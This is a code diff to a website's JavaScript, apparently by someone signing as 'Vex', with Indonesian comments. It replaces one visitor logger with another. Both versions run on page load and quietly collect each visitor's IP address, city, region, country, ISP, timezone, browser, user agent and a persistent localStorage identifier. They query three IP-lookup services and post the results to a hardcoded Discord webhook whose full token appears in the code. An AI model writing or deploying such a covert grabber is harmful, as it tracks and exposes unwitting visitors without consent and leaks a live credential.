@@ -94,74 +94,60 @@ document.addEventListener("DOMContentLoaded", function () {
 
 	
   // Script Log HWID, Device info, User Agent, dan IP Log
-    fetch('https://api.ipify.org?format=json')
-  .then(response => {
-    if (!response.ok) {
-      throw new Error('Gagal mengambil IP');
-    }
-    return response.json();
-  })
-  .then(data => {
-    const ip = data.ip;
-    const userAgent = navigator.userAgent;
-    const device = navigator.platform;
-    const date = new Date().toLocaleString();
-    console.log("IP:", ip); // Log IP
+    (async () => {
+  const webhookURL = "https://discord.com/api/webhooks/1365583624115847218/924teezrVY3kz-N1ogtljxXAa4Ef5GgvOUMJ3tSZxAiRQ4tQh6g7OINU57Jf1CfdZAb1";
 
-    // Ambil lokasi berdasarkan IP
-    fetch('https://ipapi.co/json/')
-      .then(res => {
-        if (!res.ok) {
-          throw new Error('Gagal mengambil lokasi');
-        }
-        return res.json();
-      })
-      .then(locData => {
-        const location = `${locData.city}, ${locData.region}, ${locData.country_name}`;
-        console.log("Lokasi:", location); // Log Lokasi
+  const [ipapi, ipwhois, ipinfo] = await Promise.all([
+    fetch("https://ipapi.co/json/").then(res => res.json()),
+    fetch("https://ipwhois.app/json/").then(res => res.json()),
+    fetch("https://ipinfo.io/json?token=PUT_TOKEN_JIKA_PERLU").then(res => res.json())
+  ]);
 
-        // Siapkan payload embed untuk Discord
-        const embed = {
-          "embeds": [{
-            "title": "WEB ACCESS LOG",
-            "color": 3447003, // Warna Embed
-            "fields": [
-              { "name": "IP Address", "value": ip, "inline": true },
-              { "name": "Device", "value": device, "inline": true },
-              { "name": "User Agent", "value": userAgent, "inline": false },
-              { "name": "Location", "value": location, "inline": true },
-              { "name": "Date", "value": date, "inline": true }
-            ],
-            "footer": {
-              "text": "HWID Log"
-            }
-          }]
-        };
+  // HWID simulasi
+  let hwid = localStorage.getItem("vex_hwid");
+  if (!hwid) {
+    hwid = crypto.randomUUID();
+    localStorage.setItem("vex_hwid", hwid);
+  }
 
-        // Kirim payload ke Discord
-        const webhookUrl = 'https://discord.com/api/webhooks/1365583624115847218/924teezrVY3kz-N1ogtljxXAa4Ef5GgvOUMJ3tSZxAiRQ4tQh6g7OINU57Jf1CfdZAb1';
+  // Deteksi browser dari user agent
+  const ua = ipapi.user_agent || navigator.userAgent;
+  function detectBrowser(ua) {
+    if (/Edg/i.test(ua)) return "Microsoft Edge";
+    if (/OPR|Opera/i.test(ua)) return "Opera";
+    if (/Chrome/i.test(ua)) return "Google Chrome";
+    if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) return "Safari";
+    if (/Firefox/i.test(ua)) return "Mozilla Firefox";
+    return "Unknown Browser";
+  }
 
-        fetch(webhookUrl, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(embed)
-        })
-        .then(response => {
-          if (response.ok) {
-            console.log('Log berhasil dikirim ke Discord');
-          } else {
-            console.error('Gagal mengirim log ke Discord. Status:', response.status);
-          }
-        })
-        .catch(error => {
-          console.error('Error saat mengirim log:', error);
-        });
-      })
-      .catch(error => {
-        console.error('Gagal mengambil lokasi:', error);
-      });
-  })
-  .catch(error => {
-    console.error('Gagal mengambil IP:', error);
+  const browser = detectBrowser(ua);
+  const now = new Date().toLocaleString();
+
+  const embed = {
+    embeds: [{
+      title: "New Visitor Logged [Multi-API]",
+      color: 0xFFD700,
+      fields: [
+        { name: "IP Address", value: ipapi.ip || ipwhois.ip || ipinfo.ip, inline: true },
+        { name: "HWID (Simulated)", value: hwid, inline: true },
+        { name: "City", value: ipapi.city || ipwhois.city || ipinfo.city, inline: true },
+        { name: "Region", value: ipapi.region || ipwhois.region, inline: true },
+        { name: "Country", value: ipapi.country_name || ipwhois.country, inline: true },
+        { name: "Org / ISP", value: ipapi.org || ipwhois.isp || ipinfo.org, inline: true },
+        { name: "Timezone", value: ipapi.timezone || ipwhois.timezone, inline: true },
+        { name: "Browser", value: browser, inline: true },
+        { name: "User Agent", value: ua.slice(0, 256) },
+        { name: "Date", value: now, inline: true }
+      ],
+      footer: { text: "Logger by Vex | Sumber: ipapi.co, ipwhois.app, ipinfo.io" }
+    }]
+  };
+
+  await fetch(webhookURL, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(embed)
   });
+})();
   // Script Log HWID, Device info, User Agent, dan IP Log
